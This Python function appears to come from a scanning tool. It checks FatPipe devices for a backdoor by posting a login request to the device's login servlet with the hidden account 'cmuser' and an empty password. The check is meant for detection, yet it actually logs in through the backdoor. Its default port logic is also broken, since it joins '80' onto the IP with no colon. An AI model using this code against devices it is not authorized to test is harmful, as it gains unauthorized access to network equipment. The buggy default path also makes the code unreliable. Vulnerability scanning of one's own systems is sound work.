import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def fatpipe_backdoor(ip, ports=None, timeout=10):
    headers = {"User-Agent": user_agents()}
    protocols = ["http", "https"]

    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for port in ports:
        for protocol in protocols:
            url = f"{protocol}://{ip}{port}/fpui/loginServlet"
            try:
                data = "loginParams=%7B%22username%22%3A%22cmuser%22%2C%22password%22%3A%22%22%2C%22authType%22%3A0%7D"
                response = requests.post(url, data=data, verify=False, timeout=timeout, headers=headers)
                if '"loginRes":"success"' in response.text and '"activeUserName":"cmuser"' in response.text:
                    print_colour(f"[+] FatPipe backdoor detected: {url}")
                    return True
            except requests.RequestException:
                continue
    return False
